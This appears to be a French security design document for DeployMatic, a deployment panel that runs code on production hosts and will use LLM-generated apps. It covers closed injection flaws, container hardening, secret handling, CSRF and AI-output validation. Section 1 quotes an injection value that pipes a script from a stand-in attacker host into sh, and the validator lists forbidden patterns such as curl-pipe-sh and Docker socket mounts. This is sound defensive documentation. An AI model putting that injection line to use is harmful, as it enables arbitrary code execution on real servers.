# Modèle de sécurité

## Le problème, dit franchement

DeployMatic est **un formulaire web qui exécute du code sur une machine de production**.
Au jalon 5, ce code sera écrit par un modèle de langage à partir d'une phrase saisie par
un humain. L'ensemble est, littéralement, ce qu'un attaquant chercherait à obtenir : une
interface HTTP qui prend du texte et le transforme en processus privilégiés sur un
serveur.

Les garde-fous décrits ici ne sont donc pas de l'hygiène décorative. Ils sont la raison
pour laquelle l'outil est déployable.

**Légende utilisée partout dans ce document :**

- ✅ **En place** — implémenté et vérifiable dans le code aujourd'hui.
- 🔜 **Prévu** — spécifié dans [`ROADMAP.md`](ROADMAP.md), pas encore écrit.
- ⚠️ **Écart connu** — décidé, mais avec une limite documentée.

---

## 1. ✅ L'injection par `.bootstrap-env` est fermée

### La faille

L'ancien système stockait ses paramètres dans un fichier `.bootstrap-env` au format shell :

```bash
APP_NAME="tp-app"
OVH_HOST="1.2.3.4"
```

Ce fichier était chargé par `source`. Or `source` **évalue** ce qu'il lit. Une valeur
saisie dans le formulaire web et contenant une substitution de commande s'exécutait au
chargement suivant :

```bash
APP_NAME="$(curl -s http://attaquant/x | sh)"
```

Le chemin complet était : formulaire web → écriture dans `.bootstrap-env` → `source` au
run suivant → exécution de code arbitraire avec les droits de l'utilisateur qui lance le
bootstrap. C'est le point n°5 de la dette technique de la feuille de route.

### Le correctif

Le format de configuration devient du **JSON**, lu par `jq`, et les valeurs ne traversent
plus jamais l'évaluateur du shell :

```bash
cfg() {
  local path="$1" default="${2:-}"
  value=$(jq -r --arg p "$path" 'getpath($p | split(".")) // empty | …' "$ENV_JSON")
  …
}
```

Trois propriétés font le travail :

1. **`jq` n'exécute rien.** Une valeur `$(…)` ressort comme la chaîne littérale `$(…)`.
2. **`--arg` sépare le programme des données.** Le chemin demandé par l'appelant ne peut
   pas devenir du programme `jq`, exactement comme une requête préparée en SQL.
3. **Aucun `source` de configuration ne subsiste.** La règle est absolue et se vérifie en
   une commande :
   ```bash
   grep -rn 'source.*env\|\. .*\.bootstrap-env' engine/   # doit ne rien renvoyer
   ```

### Ce qui a été vérifié

La revue de la tâche 4 du jalon 1 a mené ses propres tentatives d'injection : valeurs
hostiles dans `env.json`, chemins hostiles passés à `cfg`, identifiants de service
hostiles passés à `cfg_port`, fichiers `.bootstrap-env` piégés soumis à l'outil de
migration, JSON malformé. Aucune n'aboutit (journal d'exécution, `Task 4: SÉCURITÉ`).

`engine/tools/migrate-env.sh` convertit les anciens fichiers **sans les `source`** : il
les parse ligne par ligne avec une expression régulière et désérialise les échappements à
la main. C'est plus laborieux, et c'est le seul moyen de migrer sans rejouer la faille une
dernière fois.

### ⚠️ Écart connu

`cfg` et `spec_get` renvoient un blob JSON multi-lignes si la valeur demandée est un objet
ou un tableau au lieu d'un scalaire (journal, `Task 4` et `Task 7`, points reportés). Ce
n'est pas une faille — rien n'est évalué — mais un appelant qui suppose un scalaire peut
produire un fichier généré malformé. À surveiller dans les générateurs.

---

## 2. ✅ Validation du nom de workspace

Le nom de workspace devient un **nom de répertoire** sous `runs/`. Sans validation,
`--workspace ../../etc` fait sortir l'engine de son arborescence. C'est le point n°4 de la
dette technique.

`engine/bootstrap.sh` applique une regex avant toute chose :

```bash
if [[ ! "$WS_NAME" =~ ^[A-Za-z0-9][A-Za-z0-9_-]{0,39}$ ]]; then
  die "nom de workspace invalide : '${WS_NAME}'" 2
fi
```

Ce qui est refusé : `../foo`, `a/b`, la chaîne vide, un nom commençant par `-` (qui serait
interprété comme un drapeau), un nom de plus de 40 caractères. Trois assertions de
`engine/tests/test_dispatcher.sh` couvrent ces cas.

**C'est de la défense en profondeur, pas la défense principale.** Le correctif définitif
arrive au jalon 2 : l'API valide le nom d'application avec `^[a-z][a-z0-9-]{1,30}$` avant
même de créer le workspace. L'engine garde quand même son contrôle, parce qu'il ne fait
jamais confiance à son appelant — le jour où un autre appelant existera (un script, un
CI, un humain pressé), il sera couvert.

Cette regex a d'ailleurs déjà arbitré un conflit : une fixture de test utilisait
`_test_dispatch`, refusé par la règle du premier caractère alphanumérique. C'est la
fixture qui a cédé, pas le contrôle de sécurité (journal, `Task 6: ARBITRAGE`).

---

## 3. 🔜 Durcissement des conteneurs applicatifs

Spécifié dans la tâche 8 du jalon 1 (`lib/gen_compose.sh`), **pas encore écrit** à la date
de rédaction.

Le principe : **deux squelettes, pas un.**

### Services buildés — durcissement complet

Ce sont nos images, construites depuis nos Dockerfiles. Rien n'empêche de les contraindre :

```yaml
user: "1000:1000"
read_only: true
tmpfs: [ /tmp, /var/run, /var/cache/nginx ]
cap_drop: [ ALL ]
security_opt: [ "no-new-privileges:true" ]
healthcheck: …
deploy: { resources: { limits: { cpus: "0.2", memory: 128m } } }
logging: { driver: json-file, options: { max-size: "10m", max-file: "3" } }
```

Chaque ligne répond à quelque chose : `cap_drop: ALL` retire les capabilities Linux dont
une application web n'a aucun usage ; `no-new-privileges` empêche un binaire `setuid`
d'élever les privilèges à l'intérieur du conteneur ; `read_only` plus des tmpfs ciblés
rend le système de fichiers non modifiable, ce qui gêne considérablement la persistance
d'un implant ; les limites de ressources et le logging borné évitent qu'un service
emballé prenne toute la machine ou remplisse le disque.

C'est aussi la correction du point n°7 de la dette technique : dans l'ancien système, le
security context n'était appliqué **qu'à un seul service**.

### Services sur image tierce — durcissement partiel, et pourquoi

Seul `no-new-privileges` est appliqué. La raison est empirique et vaut la peine d'être
écrite, parce que la tentation de « durcir uniformément » est forte :

> Un `postgres:16-alpine` avec `user: "1000:1000"` et `read_only: true` **ne démarre pas**.
> L'image tourne en UID 70, et le serveur doit posséder son répertoire de données et
> pouvoir y écrire. Forcer l'UID casse la propriété du datadir ; forcer `read_only` casse
> l'écriture.

Il ne s'agit donc pas d'un oubli mais d'un arbitrage : on ne peut pas imposer notre modèle
de privilèges à une image dont on n'écrit pas le Dockerfile. La contrepartie est que les
images tierces doivent venir d'une source de confiance et être scannées (jalon 6), et
qu'un service tiers est autant que possible `internal: true` — donc sans port publié.

### Ce qui vaut pour toutes les applications

- **Un réseau Docker par application**, en `bridge`. Pas de réseau partagé entre apps.
- **`network_mode: host` est interdit**, sans exception : il annule l'isolation réseau et
  contourne l'allocation de ports.
- **Une réplique par service** (voir [`ARCHITECTURE.md`](ARCHITECTURE.md) §10).

---

## 4. Le socket Docker n'est jamais monté

✅ Décidé et appliqué dans la conception de l'engine, 🔜 à faire respecter dans le
`compose.yml` de la stack au jalon 2.

Monter `/var/run/docker.sock` dans un conteneur revient à lui donner `root` sur l'hôte :
il peut démarrer un conteneur privilégié qui monte `/`. Dans un service dont le métier est
d'exécuter du code venu d'un formulaire, c'est le chaînon qui transforme n'importe quelle
injection en compromission complète de l'hôte du panneau.

Le worker pilote donc Docker par `DOCKER_HOST=ssh://user@hôte`, y compris pour l'hôte
local, qui est une cible comme une autre. **Un seul chemin de code, aucune exception** —
et donc un seul chemin à auditer.

Conséquence utile : le panneau ne compile jamais rien. Le build se fait sur la cible, ce
qui est aussi le premier des quatre invariants du jalon 5.

---

## 5. Secrets

| Mesure | État | Détail |
|---|---|---|
| `runs/` en `700`, `env.json` et `spec.json` en `600` | ✅ | posé par le contrat de l'engine ; `migrate-env.sh` fait un `chmod 600` sur sa sortie |
| `deploy/.env` en `600` | 🔜 | spécifié tâche 8 |
| Chiffrement Fernet en base | 🔜 jalon 2 | clé lue depuis `PANEL_SECRET_KEY`, fournie par un secret Docker ou une variable d'environnement, **jamais committée**. Les secrets ne sont déchiffrés qu'au moment d'écrire `runs/<ws>/env.json` |
| Aucun secret en clair dans Postgres | 🔜 jalon 2 | critère d'acceptation n°7 du jalon 2 : `SELECT * FROM app` ne doit rien révéler |
| Clé SSH du worker par secret Docker en lecture seule | 🔜 jalon 2 | jamais dans l'image, jamais dans le dépôt |
| `docker login --password-stdin` | 🔜 jalon 1, tâche 10 | le token arrive sur **stdin**, jamais en argument : un argument de ligne de commande est lisible par tout utilisateur de la machine via `ps` |
| Clé API du LLM jamais dans les logs ni les réponses HTTP | 🔜 jalon 5 | critère d'acceptation n°6 du jalon 5 |

### ⚠️ Écart connu à corriger à la tâche 11 du jalon 1

Le `docker login` lui-même est correct (`--password-stdin`), mais l'étape qui l'appelle,
telle qu'écrite dans le plan, transmet le token à la cible **dans la chaîne de commande
SSH** :

```bash
ssh_remote "${user}@${host}" \
  "REGISTRY_USER='…' REGISTRY_TOKEN='$(cfg registry.token)' bash -s" < prepare_server.sh
```

Le token est alors visible dans `ps` **sur l'hôte cible** pendant la durée du
provisioning, et un token contenant une apostrophe casserait la commande. Le passer par
`SendEnv`/`AcceptEnv`, ou l'écrire en tête du flux envoyé sur stdin, résout les deux
problèmes. À traiter au moment d'écrire l'étape.

---

## 6. 🔜 Authentification et CSRF (jalon 2)

Le panneau est un exécuteur de code à distance : **l'authentification n'est pas du confort.**

- Mot de passe unique, haché en **argon2**, défini au premier démarrage via
  `PANEL_ADMIN_PASSWORD` ou un assistant d'initialisation.
- Session par cookie signé : `HttpOnly`, `SameSite=Strict`, `Secure`.
- **Token CSRF sur toutes les mutations.** Point important et contre-intuitif : une
  authentification posée à l'edge (BunkerWeb, `auth_basic`) **ne protège pas du CSRF** —
  le navigateur de la victime enverra ses identifiants avec la requête forgée. C'est le
  point n°6 de la dette technique.
- Vérification de l'en-tête `Origin` sur `POST`, `PATCH` et `DELETE`.
- Rate limiting sur `/login` : 5 tentatives par 5 minutes et par IP.
- Le modèle `User` prépare le multi-utilisateur ; un seul compte suffit et le
  multi-utilisateur avec rôles est explicitement hors périmètre.

**Recommandation à documenter à la livraison** : mettre le panneau derrière BunkerWeb avec
`auth_basic` et une allowlist d'IP **en plus** de l'authentification applicative, jamais à
la place. Le port du panneau est publié sur `127.0.0.1` uniquement.

---

## 7. ⚠️ L'API BunkerWeb donne des permissions admin-équivalentes (jalon 4)

À prendre au sérieux, parce que ce n'est pas évident à la lecture de la documentation.

Les permissions `service_create`, `service_update`, `config_create`, `config_update`,
`plugin_create` et `global_settings_update` sont **admin-équivalentes** : leur contenu est
rendu **verbatim** en configuration NGINX/OpenResty Lua. Un token qui les porte peut donc
faire exécuter du code sur les workers BunkerWeb.

Conséquences pour le projet :

- Le compte utilisé par le panneau est **un compte admin de fait**. Le traiter comme tel :
  chiffré en base au même titre que les autres secrets, jamais journalisé, jamais renvoyé
  par l'API du panneau.
- **L'API BunkerWeb ne doit jamais être exposée sur Internet.** Son allowlist par défaut
  (`API_WHITELIST_IPS`) couvre les plages RFC1918 ; ne pas l'élargir.
- L'authentification se fait par `POST /auth` en Basic, qui renvoie un token **Biscuit**
  réutilisé en `Authorization: Bearer`. Son TTL est réglé par `API_BISCUIT_TTL_SECONDS`
  (3600 s par défaut) ; le client doit le renouveler avant expiration.
- `API_TOKEN` est un Bearer d'override admin : **bris-de-glace uniquement**, jamais dans
  le chemin nominal.

Le client `panel/bunkerweb.py` prévoit un mode `dry_run` qui journalise les appels sans
les émettre — c'est aussi un outil de sécurité, pas seulement de débogage.

---

## 8. 🔜 Les quatre invariants de la génération par IA (jalon 5)

Aucun n'est négociable, et aucun ne repose sur la confiance dans le prompt.

1. **Jamais de build sur l'hôte du panneau.** Le build va sur la cible via
   `DOCKER_HOST=ssh://`. Le panneau orchestre, il ne compile pas.
2. **Approbation humaine obligatoire avant le build.** Le run s'arrête après la
   génération, affiche le spec et le diff des fichiers, et attend une approbation
   explicite. *Sans cette étape, un prompt suffit à exécuter du code arbitraire sur la
   production.* Le run passe en `pending_approval` avec une expiration à 24 h, et un test
   automatisé doit vérifier qu'aucun appel de build n'est émis avant l'approbation
   (critère d'acceptation n°5 du jalon 5).
3. **Validation programmatique de la sortie**, jamais la confiance dans le prompt.
4. **Réseau par application, pas d'egress libre** pour les conteneurs générés.

### Le contrat d'application, et son validateur

Ce que toute application générée doit respecter est écrit **deux fois** : dans le prompt
système *et* dans un validateur qui vérifie après coup. Le prompt oriente, il ne garantit
rien.

| Règle du contrat | Vérifiée par |
|---|---|
| Port lu depuis la variable `PORT`, jamais codé en dur | analyse statique |
| Un endpoint de santé qui répond 200 sans dépendance externe | schéma + cohérence |
| Dockerfile multi-stage, `USER 1000` en dernière instruction | analyse statique |
| Image de base dans une allowlist (`node:*-alpine`, `python:*-slim`, `nginxinc/nginx-unprivileged`, `golang:*-alpine`, `postgres:*-alpine`…) | analyse statique |
| Aucun `privileged`, `network_mode: host`, montage de socket Docker, bind mount d'un chemin hôte | analyse statique |
| Aucun secret en dur dans le code ou le Dockerfile | analyse statique |
| Pas de `curl \| sh` dans le Dockerfile | analyse statique |

`panel/validator.py` applique trois niveaux, **tous bloquants** :

1. **Schéma** — la sortie du LLM est parsée en `AppSpec` Pydantic. Un JSON invalide ou hors
   schéma est rejeté sans discussion.
2. **Statique** — parcours des Dockerfiles et des fichiers générés à la recherche des
   motifs interdits (regex, et si possible un vrai parseur de Dockerfile).
3. **Cohérence** — chaque service référencé dans `expose` existe, les ports sont distincts,
   les dépendances déclarées existent, aucun cycle.

En cas d'échec : régénération avec le rapport d'erreur en retour, **deux tentatives
maximum**, puis échec explicite. **Jamais de déploiement d'un spec non validé, jamais de
contournement manuel.**

Deux appels LLM séparés plutôt qu'un monolithique — d'abord le spec (petit, structuré,
validable), puis le code guidé par le spec **déjà validé**. Prompt et réponse sont
journalisés dans `Run` pour l'audit.

---

## 9. 🔜 Scanners de vulnérabilités (jalon 6)

- **Deux scanners, pas un** : Trivy (conservé) et Grype (ajouté). Le gain n'est pas la
  redondance mais le **recoupement** — bases de vulnérabilités différentes, donc
  couvertures différentes. L'UI doit montrer explicitement ce que l'un trouve et pas
  l'autre.
- **Syft** produit un SBOM CycloneDX, conservé comme artefact — utile bien après le
  déploiement, quand une CVE sort sur une dépendance transitive.
- **Où** : sur l'**hôte cible**, en conteneurs éphémères, après le build et **avant** le
  premier `compose up`. Pas sur l'hôte du panneau. Cache de base de vulnérabilités sur un
  volume nommé par cible, sinon chaque scan retélécharge des centaines de mégaoctets.
- **Politique par défaut** : `fail_on: HIGH,CRITICAL`, `ignore_unfixed: true`,
  `grace_period_days: 0`. Un échec bloque le déploiement.
- **Dérogation** : explicite, horodatée, **avec justification obligatoire**, enregistrée
  dans `Run`. Le raisonnement est important : *sans soupape documentée, les gens
  désactivent le scan entièrement*. Une dérogation tracée vaut mieux qu'un
  `--skip-scan` permanent dans un fichier de configuration.
- Le workflow CI généré applique **la même politique** que le panneau (critère
  d'acceptation n°6 du jalon 6).
- Docker Scout est écarté : il exige un compte Docker Hub, là où Trivy et Grype
  fonctionnent hors ligne une fois leur base à jour.

---

## 10. Ce qui n'est **pas** protégé aujourd'hui

À lire avant d'exposer quoi que ce soit :

| Point | Depuis quand ce sera couvert |
|---|---|
| L'ancienne interface `web/` (Flask) n'a **ni authentification ni CSRF** | elle est cassée et sera supprimée au jalon 2 |
| Rien n'authentifie l'appelant de `engine/bootstrap.sh` | c'est voulu : l'engine est un outil local, le contrôle d'accès est le métier du panel (jalon 2) |
| Aucun scan de vulnérabilités ne bloque un déploiement | jalon 6 (le `trivy` du workflow CI généré existe déjà mais n'est pas dans le chemin du panneau) |
| Aucune règle ufw n'est ouverte dynamiquement pour les ports applicatifs | jalon 3 |
| Aucune vérification que l'IP source vue par la cible est bien celle de BunkerWeb | jalon 3, à faire sur la machine |
| La pureté de stdout des `ui_*` n'a **aucun test de régression** | signalé au jalon 1 (journal, `Task 5`, point reporté) — vérifié seulement par revue manuelle |

---

## 11. Documents liés

- [`ARCHITECTURE.md`](ARCHITECTURE.md) — les contrats et la topologie.
- [`CONVENTIONS.md`](CONVENTIONS.md) — `jq --arg`, l'invariant stdout, le non-interactif.
- [`CURRENT-STATE.md`](CURRENT-STATE.md) — ce qui est réellement en place à ce jour.
- [`ROADMAP.md`](ROADMAP.md) — les critères d'acceptation, jalon par jalon.
